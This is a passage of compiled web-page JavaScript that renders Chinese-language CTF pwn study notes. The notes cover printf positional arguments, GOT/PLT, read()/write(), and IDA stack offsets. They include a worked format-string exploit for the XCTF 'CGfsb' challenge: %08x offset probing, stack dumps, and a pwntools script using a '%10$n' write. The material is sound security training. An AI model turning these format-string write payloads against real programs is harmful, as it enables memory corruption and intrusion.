"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%2$d %1$d"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" b"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br")])]),n("h4",{attrs:{id:"示例-cgfsb"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#示例-cgfsb"}},[t._v("#")]),t._v(" 示例 CGfsb")]),t._v(" "),n("p",[t._v("通常2次输入")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("1.1111\n2.输入 aaaa-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x\naaaa-ffffd22e-f7fb4580-00000001-00000000-00000001-f7ffd940-31310001-000a3131-00000000-61616161-3830252d-30252d78\n***1-*******2-*******3-*******4-*******5-*******6-*******7-*******8-*******9-******10-*'1111'*\n")])])]),n("p",[t._v("偏移是10, 拖动调试。第二次printf处下断点。")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("payload = flat(p32(0x0804A068), 'a'*4 ,'%10$n')\nsend(payload)后 \n")])])]),n("p",[t._v("x/16wx $esp # 查看栈情况")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("fff2a488 fff2a47e f7f47580 00000001 00000000 00000001 f7f90940 61610001 000a6161 00000000 0804a068 61616161\n******01 ******02 ******03 ******04 ******05 ******06 ******07 ******08 ******09 ******10 ******11 ***aaaa*\n")])])]),n("p",[t._v("exp:")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\ncontext"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("log_level "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'debug'")]),t._v("\nconn "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" process"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'./e41a0f684d0e497f87bb309f91737e4d'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v('# conn = remote("220.249.52.133",56225)')]),t._v("\npwnme "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" \npayload1 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'aaaa'")]),t._v("\npayload2 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" flat"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pwnme"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'%10$n'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("  "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#pwnme地址占4个字节，所以后面需要打印4个a")]),t._v("\nconn"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvuntil"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'please tell me your name:'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nconn"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# gdb.attach(conn)")]),t._v("\nconn"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvuntil"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'leave your message please:'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" \nconn"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nconn"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("conn"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvall"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br")])]),n("h3",{attrs:{id:"plt-glt"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#plt-glt"}},[t._v("#")]),t._v(" PLT & GLT")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://blog.csdn.net/linyt/article/details/51635768",target:"_blank",rel:"noopener noreferrer"}},[t._v("Link"),n("OutboundLink")],1)]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("简称")]),t._v(" "),n("th",[t._v("全称")]),t._v(" "),n("th",[t._v("Desc")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("GOT")]),t._v(" "),n("td",[t._v("Global Offset Table")]),t._v(" "),n("td",[t._v("存放函数地址的数据表，重局偏移表")])]),t._v(" "),n("tr",[n("td",[t._v("PLT")]),t._v(" "),n("td",[t._v("Procedure Link Table")]),t._v(" "),n("td",[t._v("额外代码段表，称为程序链接表")])])])]),t._v(" "),n("p",[t._v("联合出手完成重定位。")]),t._v(" "),n("p",[n("img",{attrs:{src:a(610),alt:""}})]),t._v(" "),n("h3",{attrs:{id:"常用函数"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#常用函数"}},[t._v("#")]),t._v(" 常用函数")]),t._v(" "),n("h4",{attrs:{id:"read"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#read"}},[t._v("#")]),t._v(" read()")]),t._v(" "),n("p",[t._v("用于文件描述符对应的文件中读取数据，原型：")]),t._v(" "),n("p",[n("code",[t._v("ssize_t read(int fd,void*buf,size_t count)")])]),t._v(" "),n("p",[t._v("参数说明：")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("fd: 是文件描述符, 从command line获取数据时，为0\nbuf: 为读出数据的缓冲区；\ncount: 为每次读取的字节数（是请求读取的字节数，读上来的数据保\n存在缓冲区buf中，同时文件的当前读写位置向后移）\n")])])]),n("p",[t._v("返回值：")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("成功：返回读出的字节数\n失败：返回-1，并设置errno，如果在调用read\n之前到达文件末尾，则这次read返回0\n")])])]),n("h4",{attrs:{id:"write"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#write"}},[t._v("#")]),t._v(" write()")]),t._v(" "),n("p",[t._v("用于将数据写入到文件描述符对应的文件，原型：")]),t._v(" "),n("p",[n("code",[t._v("ssize_t write(int fd,const void*buf,size_t count);")])]),t._v(" "),n("p",[t._v("参数说明：")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("fd:是文件描述符（输出到command line，就是1）\nbuf:通常是一个字符串，需要写入的字符串\ncount：是每次写入的字节数\n")])])]),n("p",[t._v("返回值：")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("成功：返回写入的字节数\n失败：返回-1并设置errno\nps： 写常规文件时，write的返回值通常等于请求写的字节\n数count， 而向终端设备或者网络写时则不一定\n")])])]),n("p",[t._v("因此，read函数就可以取代scanf从command line读取数据；write函数就可以代替printf，往command line打印输出。")]),t._v(" "),n("h1",{attrs:{id:"ida查看栈底地址"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#ida查看栈底地址"}},[t._v("#")]),t._v(" IDA查看栈底地址")]),t._v(" "),n("p",[t._v("xctf stack2示例")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000070")]),t._v(" var_70          db "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("100")]),t._v(" dup"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("?"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0000000C")]),t._v(" var_C           dd ?\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000008")]),t._v("                 db ? "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" undefined\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000007")]),t._v("                 db ? "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" undefined\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000006")]),t._v("                 db ? "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" undefined\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000005")]),t._v("                 db ? "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" undefined\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000004")]),t._v(" var_4           dd ?\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000000")]),t._v("  s              db "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v(" dup"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("?"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000004")]),t._v("  r              db "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v(" dup"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("?"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000008")]),t._v(" argc            dd ?\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0000000C")]),t._v(" argv            dd ?                    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" offset\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000010")]),t._v(" envp            dd ?                    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" offset\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000014")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("00000014")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" end of stack variables\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br")])]),n("p",[t._v("偏移值是0x84, 即栈底地址.")]),t._v(" "),n("p",[t._v("动态调试见 xctf_pwn_stack2.pdf。")])])}),[],!1,null,null,null);s.default=e.exports}}]);